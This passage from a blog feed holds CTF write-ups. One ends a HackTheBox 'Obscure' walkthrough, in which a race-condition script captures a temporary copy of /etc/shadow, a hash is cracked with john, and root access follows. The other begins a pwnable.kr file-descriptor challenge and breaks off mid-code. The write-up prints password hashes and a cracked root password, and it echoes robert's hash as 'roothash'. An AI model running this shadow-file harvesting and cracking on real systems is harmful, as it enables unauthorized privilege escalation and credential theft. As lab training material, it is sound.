class="line"><span class="string">exxxxxxxxxxxxxxxxxxx7</span></span><br></pre></td></tr></table></figure><h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>One of the first thing I do when doing recon for root is checking the sudoer file for uncommon configuration.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -S -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> robert on obscure:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User robert may run the following commands on obscure:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py</span><br></pre></td></tr></table></figure><p>Interesting, another “homemade” script. And it can be run as <code>sudo</code>. Sounds like a bad idea to me. If we can find a flaw in this <code>BetterSSH.py</code> we will be able to escalate our privileges to root.</p><p>The python script is the following:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random, string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> crypt</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">path = <span class="string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k=<span class="number">8</span>))</span><br><span class="line">session = &#123;<span class="string">&quot;user&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;authenticated&quot;</span>: <span class="number">0</span>&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    session[<span class="string">&#x27;user&#x27;</span>] = <span class="built_in">input</span>(<span class="string">&quot;Enter username: &quot;</span>)</span><br><span class="line">    passW = <span class="built_in">input</span>(<span class="string">&quot;Enter password: &quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/etc/shadow&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.readlines()</span><br><span class="line">    data = [(p.split(<span class="string">&quot;:&quot;</span>) <span class="keyword">if</span> <span class="string">&quot;$&quot;</span> <span class="keyword">in</span> p <span class="keyword">else</span> <span class="literal">None</span>) <span class="keyword">for</span> p <span class="keyword">in</span> data]</span><br><span class="line">    passwords = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> x == <span class="literal">None</span>:</span><br><span class="line">            passwords.append(x)</span><br><span class="line">    </span><br><span class="line">    passwordFile = <span class="string">&#x27;\n&#x27;</span>.join([<span class="string">&#x27;\n&#x27;</span>.join(p) <span class="keyword">for</span> p <span class="keyword">in</span> passwords])</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/tmp/SSH/&#x27;</span>+path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(passwordFile)</span><br><span class="line">    time.sleep(<span class="number">.1</span>)</span><br><span class="line">    salt = <span class="string">&quot;&quot;</span></span><br><span class="line">    realPass = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> passwords:</span><br><span class="line">        <span class="keyword">if</span> p[<span class="number">0</span>] == session[<span class="string">&#x27;user&#x27;</span>]:</span><br><span class="line">            salt, realPass = p[<span class="number">1</span>].split(<span class="string">&#x27;$&#x27;</span>)[<span class="number">2</span>:]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> salt == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Invalid user&quot;</span>)</span><br><span class="line">        os.remove(<span class="string">&#x27;/tmp/SSH/&#x27;</span>+path)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    salt = <span class="string">&#x27;$6$&#x27;</span>+salt+<span class="string">&#x27;$&#x27;</span></span><br><span class="line">    realPass = salt + realPass</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">hash</span> = crypt.crypt(passW, salt)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hash</span> == realPass:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Authed!&quot;</span>)</span><br><span class="line">        session[<span class="string">&#x27;authenticated&#x27;</span>] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Incorrect pass&quot;</span>)</span><br><span class="line">        os.remove(<span class="string">&#x27;/tmp/SSH/&#x27;</span>+path)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    os.remove(os.path.join(<span class="string">&#x27;/tmp/SSH/&#x27;</span>,path))</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    traceback.print_exc()</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> session[<span class="string">&#x27;authenticated&#x27;</span>] == <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        command = <span class="built_in">input</span>(session[<span class="string">&#x27;user&#x27;</span>] + <span class="string">&quot;@Obscure$ &quot;</span>)</span><br><span class="line">        cmd = [<span class="string">&#x27;sudo&#x27;</span>, <span class="string">&#x27;-u&#x27;</span>,  session[<span class="string">&#x27;user&#x27;</span>]]</span><br><span class="line">        cmd.extend(command.split(<span class="string">&quot; &quot;</span>))</span><br><span class="line">        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line"></span><br><span class="line">        o,e = proc.communicate()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Output: &#x27;</span> + o.decode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Error: &#x27;</span>  + e.decode(<span class="string">&#x27;ascii&#x27;</span>)) <span class="keyword">if</span> <span class="built_in">len</span>(e.decode(<span class="string">&#x27;ascii&#x27;</span>)) &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>As the name suggest, this script aim to serve as a replacement for SSH.</p><p>After reading the code we can understand the main logic is the following:</p><ol><li><p>Get the user to input username and password</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">session[<span class="string">&#x27;user&#x27;</span>] = <span class="built_in">input</span>(<span class="string">&quot;Enter username: &quot;</span>)</span><br><span class="line">passW = <span class="built_in">input</span>(<span class="string">&quot;Enter password: &quot;</span>)</span><br></pre></td></tr></table></figure></li><li><p>Open and parse the <a href="https://www.tldp.org/LDP/lame/LAME/linux-admin-made-easy/shadow-file-formats.htmlhttps://www.tldp.org/LDP/lame/LAME/linux-admin-made-easy/shadow-file-formats.html"><code>/etc/shadow</code></a> file to a temporary file in <code>/tmp/SSH/</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">path = <span class="string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k=<span class="number">8</span>))</span><br><span class="line">[...]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/etc/shadow&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">        data = f.readlines()</span><br><span class="line">    data = [(p.split(<span class="string">&quot;:&quot;</span>) <span class="keyword">if</span> <span class="string">&quot;$&quot;</span> <span class="keyword">in</span> p <span class="keyword">else</span> <span class="literal">None</span>) <span class="keyword">for</span> p <span class="keyword">in</span> data]</span><br><span class="line">    passwords = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> x == <span class="literal">None</span>:</span><br><span class="line">            passwords.append(x)</span><br><span class="line">    </span><br><span class="line">    passwordFile = <span class="string">&#x27;\n&#x27;</span>.join([<span class="string">&#x27;\n&#x27;</span>.join(p) <span class="keyword">for</span> p <span class="keyword">in</span> passwords])</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/tmp/SSH/&#x27;</span>+path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(passwordFile)</span><br></pre></td></tr></table></figure><p>at this point the created tmp file should like something like this:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root</span><br><span class="line">$6<span class="variable">$rixxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxch4dy</span></span><br><span class="line">111111</span><br><span class="line">0</span><br><span class="line">111111</span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">hg8</span><br><span class="line">$6<span class="variable">$qpePkxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxc6RAj</span>/</span><br><span class="line">111111</span><br><span class="line">0</span><br><span class="line">111111</span><br><span class="line">1</span><br></pre></td></tr></table></figure></li><li><p>Check if username exist, if username don’t exist the temp file get removed and the script exit.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> passwords:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> p[<span class="number">0</span>] == session[<span class="string">&#x27;user&#x27;</span>]:</span><br><span class="line">            salt, realPass = p[<span class="number">1</span>].split(<span class="string">&#x27;$&#x27;</span>)[<span class="number">2</span>:]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> salt == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Invalid user&quot;</span>)</span><br><span class="line">        os.remove(<span class="string">&#x27;/tmp/SSH/&#x27;</span>+path)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></li><li><p>If the username exist, the password get hashed and compared to the hash in the temp file (coming from <code>/etc/shadow</code> ) to see if they match. In the end the temp file get removed wether the password was correct or not. </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">salt = <span class="string">&#x27;$6$&#x27;</span>+salt+<span class="string">&#x27;$&#x27;</span></span><br><span class="line"></span><br><span class="line">    realPass = salt + realPass</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">hash</span> = crypt.crypt(passW, salt)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hash</span> == realPass:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Authed!&quot;</span>)</span><br><span class="line">        session[<span class="string">&#x27;authenticated&#x27;</span>] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Incorrect pass&quot;</span>)</span><br><span class="line">        os.remove(<span class="string">&#x27;/tmp/SSH/&#x27;</span>+path)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    os.remove(os.path.join(<span class="string">&#x27;/tmp/SSH/&#x27;</span>,path))</span><br></pre></td></tr></table></figure></li><li><p>If the password if also correct we get dropped in a “pseudo” shell:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> session[<span class="string">&#x27;authenticated&#x27;</span>] == <span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        command = <span class="built_in">input</span>(session[<span class="string">&#x27;user&#x27;</span>] + <span class="string">&quot;@Obscure$ &quot;</span>)</span><br><span class="line">        cmd = [<span class="string">&#x27;sudo&#x27;</span>, <span class="string">&#x27;-u&#x27;</span>,  session[<span class="string">&#x27;user&#x27;</span>]]</span><br><span class="line">        cmd.extend(command.split(<span class="string">&quot; &quot;</span>))</span><br><span class="line">        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">    </span><br><span class="line">        o,e = proc.communicate()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Output: &#x27;</span> + o.decode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Error: &#x27;</span>  + e.decode(<span class="string">&#x27;ascii&#x27;</span>)) <span class="keyword">if</span> <span class="built_in">len</span>(e.decode(<span class="string">&#x27;ascii&#x27;</span>)) &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></li></ol><p>Alright! So with all of this in mind, what can of flaw can we find in that ? </p><p>First thing that came to my mind was to edit the script to display the retrieved root hash. But of course it can not be that easy, we don’t have write rights since the file is owned by <code>root</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">robert@obscure:~/BetterSSH$ ls -l</span><br><span class="line">total 4</span><br><span class="line">-rwxr-xr-x 1 root root 1805 Oct  5 13:09 BetterSSH.py</span><br></pre></td></tr></table></figure><p>Then what? The temporary file catch the attention aswell… If we manage to read it before it get deleted, we could retrieve <code>root</code> user password hash. We are facing two issues here:</p><ol><li><p>The file name is random.</p></li><li><p>The file get deleted immediately after creation. The script allow no “pause” where we could read the file before it gets deleted.</p></li></ol><p>At this point we will need to write a script monitoring the <code>/tmp/SSH/</code> folder for any file creation and grab it’s content as fast as possible before it get deleted.</p><p>To do so, I wrote a simple script:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">path = <span class="string">&quot;/tmp/SSH/&quot;</span></span><br><span class="line"></span><br><span class="line">before = <span class="built_in">dict</span>([(file, <span class="literal">None</span>) <span class="keyword">for</span> file <span class="keyword">in</span> os.listdir(path)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    after = <span class="built_in">dict</span>([(file, <span class="literal">None</span>) <span class="keyword">for</span> file <span class="keyword">in</span> os.listdir(path)])</span><br><span class="line">    added = [file <span class="keyword">for</span> file <span class="keyword">in</span> after <span class="keyword">if</span> file <span class="keyword">not</span> <span class="keyword">in</span> before]</span><br><span class="line">    <span class="keyword">if</span> added:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(path + added[<span class="number">0</span>], <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> new_file:</span><br><span class="line">            <span class="built_in">print</span>(new_file.read())</span><br><span class="line">    before = after</span><br></pre></td></tr></table></figure><p>Basically the script will loop forever while listing file in <code>/tmp/SSH/</code>, if a new file is detected it will print its content.</p><p>Let’s drop it on the server and give it a try:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">robert@obscure:/$ python3 /tmp/watch_ssh.py</span><br></pre></td></tr></table></figure><p>In another shell let’s run the <code>betterSSH.py</code> script:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">robert@obscure:~$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py</span><br><span class="line">Enter username: hg8</span><br><span class="line">Enter password: hg8</span><br><span class="line">Invalid user</span><br></pre></td></tr></table></figure><p>Going back to our script we can see it worked!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">robert@obscure:/$ python3 /tmp/watch_ssh.py</span><br><span class="line">root</span><br><span class="line">$6$riekpK4m<span class="variable">$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1</span></span><br><span class="line">18226</span><br><span class="line">0</span><br><span class="line">99999</span><br><span class="line">7</span><br><span class="line"></span><br><span class="line">robert</span><br><span class="line">$6$fZZcDG7g<span class="variable">$lfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XU</span>.TCIHgavst7Lj8wLF/xQ21jYW5nD66aJsvQSP/y1zbH/</span><br><span class="line">18163</span><br><span class="line">0</span><br><span class="line">99999</span><br><span class="line">7</span><br></pre></td></tr></table></figure><h3 id="Cracking-Root-password-hash"><a href="#Cracking-Root-password-hash" class="headerlink" title="Cracking Root password hash"></a>Cracking Root password hash</h3><p>Now that we have the hash let’s hope it can be cracked. I will use john the ripper</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;$6$fZZcDG7g<span class="variable">$lfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XU</span>.TCIHgavst7Lj8wLF/xQ21jYW5nD66aJsvQSP/y1zbH/&quot;</span> &gt; roothash</span><br><span class="line">[hg8@archbook ~]$ john --wordlist=~/SecLists/Passwords/Leaked-Databases/rockyou.txt roothash</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">mercedes         (?)</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure><p>Alright! We have the root password, let’s try to use it with the <code>betterSSH.py</code> script:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py</span><br><span class="line">Enter username: root</span><br><span class="line">Enter password: mercedes</span><br><span class="line">Authed!</span><br><span class="line">root@Obscure$ cat /root/root.txt</span><br><span class="line">Output: 5xxxxxxxxxxxxxxxxxxxxxxxxx3</span><br></pre></td></tr></table></figure><hr><p>As always do not hesitate to contact me for any questions or feedbacks.</p><p>See you next time !</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Medium Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> python </tag>
            
            <tag> re </tag>
            
            <tag> obscurity </tag>
            
            <tag> custom-exploitation </tag>
            
            <tag> encryption </tag>
            
            <tag> john </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable.kr - FD</title>
      <link href="/posts/pwnable/fd/"/>
      <url>/posts/pwnable/fd/</url>
      
        <content type="html"><![CDATA[<p><img src="https://user-images.githubusercontent.com/9076747/82187694-12e6ad00-98ed-11ea-88da-0c05f6fcb13f.png" alt="fd"></p><p>One of my objective in 2020 is to level up in Reverse Engineering. Since I am starting from zero I got few people recommend <a href="http://pwnable.kr/">http://pwnable.kr</a> which appear to have a reasonable curve of difficulty making it ideal for learning. </p><p>If you have other recommandations for good ressources to learn and practices Reverse Engineering feels free to let me know below in a comment or <a href="https://hg8.sh/about/">contact me</a> ;)</p><p>That being said, here is my write-up for the first challenge of pwnable.kr: FD. </p><p>Let’s go!</p><hr><h2 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h2><blockquote><p><strong>FD</strong></p><p>Mommy! what is a file descriptor in Linux?<br>ssh <a href="mailto:&#102;&#100;&#x40;&#112;&#x77;&#x6e;&#97;&#x62;&#x6c;&#x65;&#x2e;&#107;&#x72;">&#102;&#100;&#x40;&#112;&#x77;&#x6e;&#97;&#x62;&#x6c;&#x65;&#x2e;&#107;&#x72;</a> -p2222 (pw:guest)</p></blockquote><p>This gives us an SSH access to a box with a hint that this challenge is going to be about File Descriptor</p><h2 id="File-Descriptor"><a href="#File-Descriptor" class="headerlink" title="File Descriptor"></a>File Descriptor</h2><p>In Unix a file descriptor is abstract indicator (handle) used to access a file or other input/output resource. A file descriptor is a non-negative integer, generally represented in the C programming language as the type int.</p><p>You are surely familiar with the three most common file descriptor:</p><ul><li>0 - stdin (Standard Input)</li><li>1 -  stdout (Standard Output)</li><li>2 - stderr (Standard Error)</li></ul><p>But file descriptor goes farther than that. To make it simple, file descriptor are used when you open a file.<br>When you do so, the OS will store the information about this file in a table entry. Theses table entries are represented with integers. The entry number is the file descriptor. </p><h2 id="Source-Code-Analysis"><a href="#Source-Code-Analysis" class="headerlink" title="Source Code Analysis"></a>Source Code Analysis</h2><p>The first thing we notice when connecting to the box is that code source of the challenge is available:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh fd@pwnable.kr -p2222</span><br><span class="line">fd@pwnable.kr<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string"> ____  __    __  ____    ____  ____   _        ___      __  _  ____</span></span><br><span class="line"><span class="string">|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \</span></span><br><span class="line"><span class="string">|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  &#x27;</span> / |  D  )</span><br><span class="line">|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    /</span><br><span class="line">|  |  |  `  <span class="string">&#x27;  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \</span></span><br><span class="line"><span class="string">|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \</span></span><br><span class="line"><span class="string">|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Sun May  3 10:21:23 2020 from 93.172.62.192</span></span><br><span class="line"><span class="string">fd@pwnable:~$ ls -l</span></span><br><span class="line"><span class="string">total 16</span></span><br><span class="line"><span class="string">-r-sr-x--- 1 fd_pwn fd   7322 Jun 11  2014 fd</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root   root  418 Jun 11  2014 fd.c</span></span><br><span class="line"><span class="string">-r--r----- 1 fd_pwn root   50 Jun 11  2014 flag</span></span><br></pre></td></tr></table></figure><p>Let’s a take a look to understand what it’s doing:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;pass argv[1] a number\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">&quot;LETMEWIN\n&quot;</span>, buf))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;good job :)\n&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;learn about Linux file IO\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Let’s break things down. The first information we get is that the app need an extra arguments in a form of a number:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span 